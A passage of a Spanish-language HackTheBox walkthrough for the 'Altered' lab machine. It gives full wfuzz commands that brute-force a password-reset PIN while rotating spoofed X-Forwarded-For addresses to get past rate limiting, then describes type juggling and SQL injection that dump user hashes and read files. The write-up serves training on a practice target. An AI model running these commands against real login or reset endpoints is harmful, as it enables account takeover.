class="no">Options</span><span class="p">[</span><span class="no">SAMEORIGIN</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">UA</span><span class="o">-</span><span class="no">Compatible</span><span class="p">[</span><span class="no">IE</span><span class="o">=</span><span class="n">edge</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>La pagina web nos redirige a un panel de login.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/1.png" />
</p>

<ul>
  <li>Si probamos con <code class="language-plaintext highlighter-rouge">admin:admin</code> no funciona pero si le damos en recuperar contraseña vemos que nos dicen que introduzcamos un PIN que nos envían al parecer por correo pero no tenemos acceso al correo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/2.png" />
</p>

<ul>
  <li>Si ponemos <code class="language-plaintext highlighter-rouge">PINs</code> incorrectos nos da este error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/3.png" />
</p>

<ul>
  <li>Tenemos 2 cookies.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/4.png" />
</p>

<h2 id="rate-limit-bypass">Rate-Limit Bypass</h2>

<ul>
  <li>Lo que podemos hacer es Fuerza bruta al <code class="language-plaintext highlighter-rouge">PIN</code> con <code class="language-plaintext highlighter-rouge">wfuzz</code> pero primero tenemos que capturar la petición a la hora de mandar el PIN para saber como esta viajando la data.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/5.png" />
</p>

<ul>
  <li>Después de un cierto momento al parecer nos bloquean.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/6.png" />
</p>

<ul>
  <li>
    <p>Existen formas de hacer <code class="language-plaintext highlighter-rouge">Bypass</code> <a href="https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass">https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass</a> ya que al parecer si ve que estamos tramitando muchas peticiones desde una misma IP nos bloquea, vamos abusar de las cabeceras.</p>
  </li>
  <li>
    <p>El problema de enviar esta petición es que se va a dar cuenta de que no es dinamico.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-H</span> <span class="s2">"X-Originating-IP: 127.0.0.1"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
</code></pre></div></div>

<ul>
  <li>
    <p>Tendremos que crear un diccionario con diferentes <code class="language-plaintext highlighter-rouge">IPs</code>.</p>
  </li>
  <li>
    <p>Mediante 2 bucles aninados vamos a crear el diccionario con las <code class="language-plaintext highlighter-rouge">IPs</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>0..40<span class="o">}</span><span class="p">;</span> <span class="k">do for </span>j <span class="k">in</span> <span class="o">{</span>0..253<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"10.10.</span><span class="nv">$i</span><span class="s2">.</span><span class="nv">$j</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done</span> <span class="o">&gt;</span> IPs
❯ <span class="nb">wc</span> <span class="nt">-l</span> IPs
10414 IPs
</code></pre></div></div>

<ul>
  <li>Si lo ejecutamos vemos que no esta iterando.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-w</span> /home/miguelrega7/Hackthebox/altered/content/IPs <span class="nt">-H</span> <span class="s2">"X-Originating-IP: FUZ2Z"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://10.10.11.159/api/resettoken
Total requests: 104140000

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                        
<span class="o">=====================================================================</span>

000000001:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.0"</span>                             
000000003:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.2"</span>                             
000000016:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.15"</span>                            
000000019:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.18"</span>                            
000000007:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.6"</span>                             
000000020:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.19"</span>                            
000000018:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.17"</span>                            
000000015:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.14"</span>                            
000000014:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.13"</span>                            
000000009:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.8"</span>                             
000000011:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.10"</span>                            
000000017:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.16"</span>                            
000000013:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.12"</span>                            
000000064:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.63"</span>                            
000000061:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.60"</span>                            
000000059:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.58"</span>                            
000000063:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.62"</span>                            
000000062:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.61"</span>                            
000000060:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.59"</span>                            
000000057:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.56"</span>                            
000000056:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.55"</span>                            
000000054:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.53"</span>                            
000000053:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.52"</span>                            
000000050:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.49"</span>                            
000000071:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.70"</span>                            
000000069:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.68"</span>                            
000000073:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.72"</span>                            
000000058:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.57"</span>                            
000000075:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.74"</span>                            
000000070:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.69"</span>                            
000000049:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.48"</span>                            
000000052:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.51"</span>                            
000000072:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.71"</span>                            
000000048:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.47"</span>                            
000000068:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.67"</span>                            
000000051:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.50"</span>                            
000000067:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.66"</span>                            
000000082:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.81"</span>                            
000000078:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.77"</span>                            
000000076:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.75"</span>                            
000000047:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.46"</span>                            
000000045:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.44"</span>                            
000000055:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.54"</span>                            
000000090:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.89"</span>                            
000000087:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.86"</span>                            
000000086:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.85"</span>                            
000000081:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.80"</span>                            
000000077:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.76"</span>  
</code></pre></div></div>

<ul>
  <li>Para que itere tenemos que usar el parámetro <code class="language-plaintext highlighter-rouge">-m</code> en <code class="language-plaintext highlighter-rouge">wfuzz</code> para que itere.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-m</span> zip <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-w</span> /home/miguelrega7/Hackthebox/altered/content/IPs <span class="nt">-H</span> <span class="s2">"X-Originating-IP: FUZ2Z"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno si lo ejecutamos nos sigue bloqueando.</p>
  </li>
  <li>
    <p>Vamos a cambiar las cabecera a esta.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-m</span> zip <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-w</span> /home/miguelrega7/Hackthebox/altered/content/IPs <span class="nt">-H</span> <span class="s2">"X-Forwarded-For: FUZ2Z"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
</code></pre></div></div>

<ul>
  <li>No nos bloquea pero obtenemos respuestas iguales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000001471:   200        140 L    324 W      5644 Ch     <span class="s2">"1470 - 10.10.5.200"</span>                           
000001474:   200        140 L    324 W      5644 Ch     <span class="s2">"1473 - 10.10.5.203"</span>                           
000001490:   200        140 L    324 W      5644 Ch     <span class="s2">"1489 - 10.10.5.219"</span>                           
000001478:   200        140 L    324 W      5644 Ch     <span class="s2">"1477 - 10.10.5.207"</span>                           
000001502:   200        140 L    324 W      5644 Ch     <span class="s2">"1501 - 10.10.5.231"</span>                           
000001501:   200        140 L    324 W      5644 Ch     <span class="s2">"1500 - 10.10.5.230"</span>                           
000001477:   200        140 L    324 W      5644 Ch     <span class="s2">"1476 - 10.10.5.206"</span>                           
000001500:   200        140 L    324 W      5644 Ch     <span class="s2">"1499 - 10.10.5.229"</span>                           
000001496:   200        140 L    324 W      5644 Ch     <span class="s2">"1495 - 10.10.5.225"</span>                           
000001504:   200        140 L    324 W      5644 Ch     <span class="s2">"1503 - 10.10.5.233"</span>                           
000001497:   200        140 L    324 W      5644 Ch     <span class="s2">"1496 - 10.10.5.226"</span>                           
000001503:   200        140 L    324 W      5644 Ch     <span class="s2">"1502 - 10.10.5.232"</span>                           
000001499:   200        140 L    324 W      5644 Ch     <span class="s2">"1498 - 10.10.5.228"</span>                           
000001495:   200        140 L    324 W      5644 Ch     <span class="s2">"1494 - 10.10.5.224"</span>                           
000001498:   200        140 L    324 W      5644 Ch     <span class="s2">"1497 - 10.10.5.227"</span>                           
000001492:   200        140 L    324 W      5644 Ch     <span class="s2">"1491 - 10.10.5.221"</span>                           
000001507:   200        140 L    324 W      5644 Ch     <span class="s2">"1506 - 10.10.5.236"</span>                           
000001511:   200        140 L    324 W      5644 Ch     <span class="s2">"1510 - 10.10.5.240"</span>                           
000001493:   200        140 L    324 W      5644 Ch     <span class="s2">"1492 - 10.10.5.222"</span>                           
000001505:   200        140 L    324 W      5644 Ch     <span class="s2">"1504 - 10.10.5.234"</span>                           
000001520:   200        140 L    324 W      5644 Ch     <span class="s2">"1519 - 10.10.5.249"</span>                           
000001489:   200        140 L    324 W      5644 Ch     <span class="s2">"1488 - 10.10.5.218"</span>                           
000001491:   200        140 L    324 W      5644 Ch     <span class="s2">"1490 - 10.10.5.220"</span>                           
000001506:   200        140 L    324 W      5644 Ch     <span class="s2">"1505 - 10.10.5.235"</span>                           
000001517:   200        140 L    324 W      5644 Ch     <span class="s2">"1516 - 10.10.5.246"</span>                           
000001514:   200        140 L    324 W      5644 Ch     <span class="s2">"1513 - 10.10.5.243"</span>                           
000001516:   200        140 L    324 W      5644 Ch     <span class="s2">"1515 - 10.10.5.245"</span>                           
000001534:   200        140 L    324 W      5644 Ch     <span class="s2">"1533 - 10.10.6.9"</span>                             
000001530:   200        140 L    324 W      5644 Ch     <span class="s2">"1529 - 10.10.6.5"</span>                             
000001513:   200        140 L    324 W      5644 Ch     <span class="s2">"1512 - 10.10.5.242"</span>                           
000001525:   200        140 L    324 W      5644 Ch     <span class="s2">"1524 - 10.10.6.0"</span>                             
000001542:   200        140 L    324 W      5644 Ch     <span class="s2">"1541 - 10.10.6.17"</span>                            
000001527:   200        140 L    324 W      5644 Ch     <span class="s2">"1526 - 10.10.6.2"</span>                             
000001538:   200        140 L    324 W      5644 Ch     <span class="s2">"1537 - 10.10.6.13"</span>                            
000001541:   200        140 L    324 W      5644 Ch     <span class="s2">"1540 - 10.10.6.16"</span>                            
000001540:   200        140 L    324 W      5644 Ch     <span class="s2">"1539 - 10.10.6.15"</span>  
</code></pre></div></div>

<ul>
  <li>Bueno ahora es mas fácil solo ocultamos respuestas con esos caracteres y listo pero antes capturaremos otra vez la petición para cambiar la cookie y sea valida para la petición que estamos haciendo desde la web.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hh</span><span class="o">=</span>5644 <span class="nt">-m</span> zip <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-w</span> /home/miguelrega7/Hackthebox/altered/content/IPs <span class="nt">-H</span> <span class="s2">"X-Forwarded-For: FUZ2Z"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjZkcFJRb0VjN3NnM0czZ3hXN2t2c3c9PSIsInZhbHVlIjoiVC93OVZvNlBGZXlYTWFJaEwrMmNRalY3cExsYUNBNnBOU01vU0dDankwR1JvVHExdk0xWERmUDVMZ1QvNWxYZVFmbVBEaTJNekVKTDdNUExIcFBuenNHSUkyT1B1b3YvTUxScldNbUM5VzNaWThWWC9oWXZPUzNFZmJyYTdzZU8iLCJtYWMiOiJhODViMmZmYTFkZGRkMGFkZTE4ZDFhNWE2NWY5ZTgwOWE0ZTBlMjhiNjAxZDQyOTFhOTE1ODk5NTYxMWY2Nzc2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://10.10.11.159/api/resettoken
Total requests: 10000

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                        
<span class="o">=====================================================================</span>

000001052:   200        138 L    303 W      5366 Ch     <span class="s2">"1051 - 10.10.4.35"</span> 
</code></pre></div></div>

<ul>
  <li>
    <p>Tenemos un <code class="language-plaintext highlighter-rouge">PIN code</code> vamos a probarlo.</p>
  </li>
  <li>
    <p>Y bueno funciona.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/7.png" />
</p>

<ul>
  <li>Funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/8.png" />
</p>

<ul>
  <li>Y bueno estamos dentro.</li>
</ul>

<h2 id="shell-as-www-data--type-juggling">Shell as www-data &amp;&amp; Type Juggling</h2>

<ul>
  <li>
    <p>Vamos a capturar con <code class="language-plaintext highlighter-rouge">Burpsuite</code> muchas peticiones a la hora de dar <code class="language-plaintext highlighter-rouge">click</code> en <code class="language-plaintext highlighter-rouge">view</code> en cada <code class="language-plaintext highlighter-rouge">profile</code> ya que no vemos nada interesante.</p>
  </li>
  <li>
    <p>Vemos que son estáticas no cambian el <code class="language-plaintext highlighter-rouge">secret</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/9.png" />
</p>

<ul>
  <li>Si cambiamos el <code class="language-plaintext highlighter-rouge">secret</code> añadiendo otro carácter nos detecta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/10.png" />
</p>

<ul>
  <li>Si cambiamos el <code class="language-plaintext highlighter-rouge">request method</code> obtenemos la siguiente respuesta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/11.png" />
</p>

<ul>
  <li>Si lo ponemos en <code class="language-plaintext highlighter-rouge">GET</code> manualmente obtenemos una data diferente por que si lo acepta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/12.png" />
</p>

<ul>
  <li>Vamos a cambiar la petición a un JSON.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/13.png" />
</p>

<ul>
  <li>Si alteramos la data cambiando un valor o agregando otro nos da este error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/14.png" />
</p>

<ul>
  <li>Lo mas probable es que por detrás se aplique una comparativa al valor del <code class="language-plaintext highlighter-rouge">secret</code> que tiene que ser exactamente ese para que funcione pero cuando se aplican comparativas usando <code class="language-plaintext highlighter-rouge">==</code> podemos poner un True y va a hacer correcto por eso mejor siempre usar un <code class="language-plaintext highlighter-rouge">===</code> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/15.png" />
</p>

<h2 id="sql-injection">SQL Injection</h2>

<ul>
  <li>Si añadimos una comilla en el campo <code class="language-plaintext highlighter-rouge">id</code> obtenemos un error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/16.png" />
</p>

<ul>
  <li>Si probamos haciendo un ordenamiento para ver si es vulnerable a <code class="language-plaintext highlighter-rouge">SQLI</code> obtenemos lo mismo con o sin comilla.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/17.png" />
</p>

<ul>
  <li>Sin embargo al llegar a 3 no obtenemos un error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/18.png" />
</p>

<ul>
  <li>Si enviamos la petición no vemos los números para poder cambiar la <code class="language-plaintext highlighter-rouge">query</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/19.png" />
</p>

<ul>
  <li>Si cambiamos el numero del id vemos que el campo que podemos escribir es en el 3.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/20.png" />
</p>

<ul>
  <li>Sabemos el nombre de la base de datos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/21.png" />
</p>

<ul>
  <li>Estas son todas las bases de datos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/22.png" />
</p>

<ul>
  <li>Vamos a ver las tablas de la base de datos <code class="language-plaintext highlighter-rouge">uhc</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/23.png" />
</p>

<ul>
  <li>Ahora las columnas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/24.png" />
</p>

<ul>
  <li>Vemos los usuarios y sus hashes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/25.png" />
</p>

<ul>
  <li>
    <p>Ninguna de las credenciales que obtendremos después de crackear los hashes nos funcionan para conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code>.</p>
  </li>
  <li>
    <p>Pero podemos leer archivos.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/26.png" />
</p>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos ver la flag.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/27.png" />
</p>

<ul>
  <li>
    <p>Algo que podemos hacer es ver si tenemos capacidad de escritura sabemos que la web corre <code class="language-plaintext highlighter-rouge">Nginx</code> y <code class="language-plaintext highlighter-rouge">PHP</code> pero necesitamos saber la ruta donde guardaría algún archivo que escribamos.</p>
  </li>
  <li>
    <p>Encontramos donde esta montada la web.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/28.png" />
</p>

<ul>
